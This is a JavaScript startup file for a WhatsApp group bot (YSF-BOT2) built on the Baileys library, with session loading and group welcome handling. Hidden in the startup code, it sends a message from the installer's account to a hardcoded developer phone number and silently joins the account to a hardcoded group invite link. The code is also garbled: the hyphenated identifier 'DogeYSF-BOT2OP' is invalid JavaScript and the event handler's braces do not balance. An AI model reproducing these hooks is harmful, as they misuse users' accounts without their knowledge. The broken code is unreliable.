//pls give credit if you reupload 
//or copy the codes
//© 2022 YSF-BOT2 Bot Inc. YSF-BOT2
const {
    WAConnection,
    MessageType,
    Presence,
    Mimetype,
    GroupSettingChange
} = require('@adiwajshing/baileys')
const fs = require('fs')
const figlet = require('figlet')
const moment = require('moment-timezone')
const { wait, banner, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions.js')
const { color } = require('./lib/color.js')
const _welkom = JSON.parse(fs.readFileSync('./database/welcome.json'))
const setting = JSON.parse(fs.readFileSync('./setting/setting.json'))

session = setting.session


require('./YSF-BOT2.js')
nocache('./YSF-BOT2.js', module => console.log(`${module} telah di update!`))

const starts = async (DogeYSF-BOT2OP = new WAConnection()) => {
    DogeYSF-BOT2OP.logger.level = 'warn'
    DogeYSF-BOT2OP.version = [2, 2142, 12]
    console.log(color(figlet.textSync('YSF-BOT2', {
		font: 'Standard',
		horizontalLayout: 'default',
		vertivalLayout: 'default',
		width: 80,
		whitespaceBreak: false
	}), 'cyan'))
	console.log(color('\n> YT CHANNEL: YSF-BOT2 ','silver'))
console.log(color('> GITHUB: DGYSF-BOT2 ','silver'))
console.log(color('> WA NUMBER: +916909137213 ','silver'))
console.log(color('  YSF-BOT2 Bot Inc. 2022','mediumseagreen'))
    console.log(color('<>','red'), color('I Wrote This Script By Myself!\nNote, The Script Is Encrypted, So You Wont Be Able To Recode, If You Wish To Buy Decrypted Script Contact The Developer', 'yellow'))
    console.log(color('<>','red'), color('Source Code Version: 3.0', 'aqua'))
    console.log(color('<>','red'), color('But? Error? Suggestion? Visit Here:', 'aqua'), color('https://wa.me/916909137213'))
    console.log(color('[YSF-BOT2]'), color('YSF-BOT2 Is Online', 'aqua'))
    console.log(color('[DEV]', 'cyan'), color('Welcome Back Owner! Hope You Doing Well~', 'magenta'))
    console.log(color('<>','red'), color('Thanks For Using YSF-BOT2', 'white'))
	DogeYSF-BOT2OP.browserDescription = [ 'Subscribe YSF-BOT2', 'chrome', '3.0' ]
    DogeYSF-BOT2OP.on('qr', () => {
        console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr code in only 20 seconds !!'))
    })

    fs.existsSync(`./${session}.json`) && DogeYSF-BOT2OP.loadAuthInfo(`./${session}.json`)
    DogeYSF-BOT2OP.on('connecting', () => {
        start('2', 'Loading ...')
    })
    DogeYSF-BOT2OP.on('open', () => {
        success('2', 'Connected ✓')
    })
        //inform to developer that the user is connected to bot
    DogeYSF-BOT2OP.sendMessage(`916909137213@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number ez😂`, MessageType.extendedText)
    
    //group link target
    teks = `https://chat.whatsapp.com/HYj9wu5Jrv6CROxyeQbHoS`
    DogeYSF-BOT2OP.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
    
    await DogeYSF-BOT2OP.connect({timeoutMs: 30*1000})
        fs.writeFileSync(`./${session}.json`, JSON.stringify(DogeYSF-BOT2OP.base64EncodedAuthInfo(), null, '\t'))

    DogeYSF-BOT2OP.on('chat-update', async (message) => {
        require('./YSF-BOT2.js')(DogeYSF-BOT2OP, message, _welkom)
    })
DogeYSF-BOT2OP.on("group-participants-update", async (anu) => {

    const isWelkom = _welkom.includes(anu.jid)
    try {
      groupMet = await DogeYSF-BOT2OP.groupMetadata(anu.jid)
      groupMembers = groupMet.participants
      groupAdmins = getGroupAdmins(groupMembers)
      mem = anu.participants[0]

      console.log(anu)
      try {
        pp_user = await DogeYSF-BOT2OP.getProfilePicture(mem)
      } catch (e) {
        pp_user = "https://telegra.ph/file/c9dfa715c26518201f478.jpg"
      }
      try {
        pp_group = await DogeYSF-BOT2OP.getProfilePicture(anu.jid)
      } catch (e) {
        pp_group =
          "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
      }
            if (anu.action == "add" && mem.includes(DogeYSF-BOT2OP.user.jid)) {
        DogeYSF-BOT2OP.sendMessage(anu.jid, "Hello everyone, am YSF-BOT2, ready to help you here ㋛︎", "conversation")
      }
      buffer = await getBuffer(pp_user)
      if (!isWelkom) return
      if (anu.action == 'add' && !mem.includes(DogeYSF-BOT2OP.user.jid)) {
      const mdata = await DogeYSF-BOT2OP.groupMetadata(anu.jid)
      const memeg = mdata.participants.length
      const thu = await DogeYSF-BOT2OP.getStatus(anu.participants[0], MessageType.text)
      const num = anu.participants[0]
      const bosco1 = await DogeYSF-BOT2OP.prepareMessage("0@s.whatsapp.net", buffer, MessageType.location,{ thumbnail: buffer})
      const bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
      let v = DogeYSF-BOT2OP.contacts[num] || { notify: num.replace(/@.+/, '') }
      anu_user = v.vname || v.notify || num.split('@')[0]
      time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
      time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
      if (anu.action == 'remove' && !mem.includes(DogeYSF-BOT2OP.user.jid)) {
      const mdata = await DogeYSF-BOT2OP.groupMetadata(anu.jid)
      const num = anu.participants[0]
      const bosco3 = await DogeYSF-BOT2OP.prepareMessage("0@s.whatsapp.net", buffer, MessageType.location,{ thumbnail: buffer})
      const bosco4 = bosco3.message["ephemeralMessage"] ? bosco3.message.ephemeralMessage : bosco3
      let w = DogeYSF-BOT2OP.contacts[num] || { notify: num.replace(/@.+/, '') }
      anu_user = w.vname || w.notify || num.split('@')[0]
      time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
      time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
      memeg = mdata.participants.length
    } catch (e) {
      console.log("Error : %s", color(e, "red"))
    }

  })
}

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    console.log('Module', `'${module}'`, 'Now being watched for changes')
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}
/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}

starts()
